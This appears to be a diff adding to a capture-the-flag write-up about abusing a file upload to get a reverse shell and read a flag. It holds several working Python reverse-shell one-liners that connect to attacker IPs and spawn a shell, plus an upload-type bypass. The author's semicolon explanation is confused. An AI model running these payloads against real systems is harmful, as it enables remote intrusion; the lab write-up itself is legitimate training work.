@@ -12,6 +12,10 @@ This was our first look of our target. Here tappable item were change the profil
 
 Now as we heard that we can uplaod something.
 
+When we checked in the response body of it is saying it's a python sever.
+
+So we will try uploading different python shells.
+
 we did try with diffrent reverse shells with the listerner running **ncat -lvnp 1234** like 
 
 reverse shell 1
@@ -221,3 +225,74 @@ Now we will upload this php file
 ```
 
 And change the file type to **image/jpeg** and see what happens..
+
+The only uploadable file is here now extention with a image file extention.
+
+Lets look at the python reverse shells 2 4 and 5.
+
+We should trim some part of that code and then we should try then only it should be executed but we were trying blindly.
+
+New Rev shell 1
+
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_tun0_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
+
+After this i got the rev shell but instantly closes.
+
+
+![listener](listener.png)
+
+After this there was a hope that i could now do something.
+
+Lets change the port number and see it uploads or not 
+
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_tun0_ip>",1233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+```
+
+but still got the 
+
+![listener](listener.png)
+
+Changing the filename too gave the same error.
+
+Lets try now anothers too truncuated rev shell 4
+
+```
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+``` 
+
+With this too even with the changed port i got 
+
+![listener](listener.png)
+
+
+Lets try now anothers too truncuated rev shell 5
+
+
+```
+import os,pty,socket;s=socket.socket();s.connect(("10.49.145.217",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+```
+With this too even with the changed port i got 
+
+![listener](listener.png)
+
+Lets try the rev shell 6 again 
+
+```
+import os,socket,subprocess;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.246.164",1234));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);
+```
+The modification it requires in this file is removed semi-colon from each line then it works again but for my case only. i have already a each code in new line and still used the semicolon but if you're doing this into  1 line semicolon in mandatory with that scenario.
+
+With removed semi-colon i got the shell.
+
+![shell](shell.png)
+
+and in the current folder there will be flag.txt file and that is the file that contains the flag.
